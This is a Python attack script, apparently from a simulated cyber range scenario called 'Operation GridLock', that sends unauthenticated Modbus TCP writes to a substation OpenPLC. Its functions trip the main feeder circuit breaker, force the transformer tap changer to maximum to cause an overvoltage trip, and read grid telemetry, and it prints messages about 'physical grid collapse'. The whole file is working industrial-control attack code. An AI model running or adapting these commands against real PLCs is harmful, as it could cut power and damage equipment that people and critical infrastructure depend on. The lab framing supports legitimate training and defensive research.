#!/usr/bin/env python3
"""
Modbus TCP Command Injection Tool
Attacker utility for manipulating Substation OpenPLC registers in Operation GridLock.
"""

import sys
import argparse
try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    try:
        from pymodbus.client.sync import ModbusTcpClient
    except ImportError:
        from pymodbus.client.tcp import ModbusTcpClient


def trip_breaker(target_ip, port=502):
    print(f"[*] Target Substation PLC: {target_ip}:{port}")
    print("[*] Sending Modbus Write Single Coil (0x05) -> Address 0x0000 = False (0x0000)")
    client = ModbusTcpClient(target_ip, port=port)
    if not client.connect():
        print(f"[!] Error: Could not connect to Modbus TCP server at {target_ip}:{port}")
        sys.exit(1)
    
    # Write False to Coil 0 (CB_MAIN_CLOSED)
    res = client.write_coil(0, False)
    if res.isError():
        print(f"[!] Modbus write error: {res}")
    else:
        print("[+] SUCCESS: Main Feeder Circuit Breaker trip command transmitted successfully!")
        print("[+] Observe GridLAB-D logs or SCADA telemetry for physical grid collapse.")
    client.close()

def close_breaker(target_ip, port=502):
    print(f"[*] Target Substation PLC: {target_ip}:{port}")
    print("[*] Sending Modbus Write Single Coil (0x05) -> Address 0x0000 = True (0xFF00)")
    client = ModbusTcpClient(target_ip, port=port)
    if not client.connect():
        print(f"[!] Error: Could not connect to Modbus TCP server at {target_ip}:{port}")
        sys.exit(1)
    
    # Write True to Coil 0 (CB_MAIN_CLOSED)
    res = client.write_coil(0, True)
    if res.isError():
        print(f"[!] Modbus write error: {res}")
    else:
        print("[+] SUCCESS: Main Feeder Circuit Breaker close command transmitted successfully!")
    client.close()

def force_overvoltage(target_ip, port=502):
    print(f"[*] Target Substation PLC: {target_ip}:{port}")
    print("[*] Sending Modbus Write Holding Register (0x06) -> Address 0x0002 (Tap Position) = +16")
    client = ModbusTcpClient(target_ip, port=port)
    if not client.connect():
        print(f"[!] Error: Could not connect to Modbus TCP server at {target_ip}:{port}")
        sys.exit(1)
    
    # Write +16 to Holding Register 2 (Tap Position)
    res = client.write_register(2, 16)
    if res.isError():
        print(f"[!] Modbus write error: {res}")
    else:
        print("[+] SUCCESS: Tap changer position set to maximum (+16). Overvoltage trip forced!")
    client.close()

def read_telemetry(target_ip, port=502):
    print(f"[*] Target Substation PLC: {target_ip}:{port}")
    client = ModbusTcpClient(target_ip, port=port)
    if not client.connect():
        print(f"[!] Error: Could not connect to Modbus TCP server at {target_ip}:{port}")
        sys.exit(1)
    
    coils = client.read_coils(0, count=3)
    regs = client.read_holding_registers(0, count=4)
    
    if not coils.isError() and not regs.isError():
        print(f"    - Circuit Breaker Closed: {coils.bits[0]}")
        print(f"    - Capacitor Bank Active: {coils.bits[1]}")
        print(f"    - Overvoltage Alarm:     {coils.bits[2]}")
        print(f"    - Bus 632 Voltage:       {regs.registers[0] / 10.0} V")
        print(f"    - Feeder Load:           {regs.registers[1]} kW")
        print(f"    - Tap Position:          {regs.registers[2]}")
        print(f"    - Grid Frequency:        {regs.registers[3] / 100.0} Hz")
    client.close()

def main():
    parser = argparse.ArgumentParser(description="Substation Modbus TCP Command Injection Tool")
    parser.add_argument("--target", default="10.0.3.10", help="Target Substation PLC IP (default: 10.0.3.10)")
    parser.add_argument("--port", type=int, default=502, help="Modbus TCP Port (default: 502)")
    parser.add_argument("--action", choices=["trip_breaker", "close_breaker", "force_overvoltage", "read"], default="trip_breaker", help="Attack action")

    args = parser.parse_args()

    if args.action == "trip_breaker":
        trip_breaker(args.target, args.port)
    elif args.action == "close_breaker":
        close_breaker(args.target, args.port)
    elif args.action == "force_overvoltage":
        force_overvoltage(args.target, args.port)
    elif args.action == "read":
        read_telemetry(args.target, args.port)

if __name__ == "__main__":
    main()
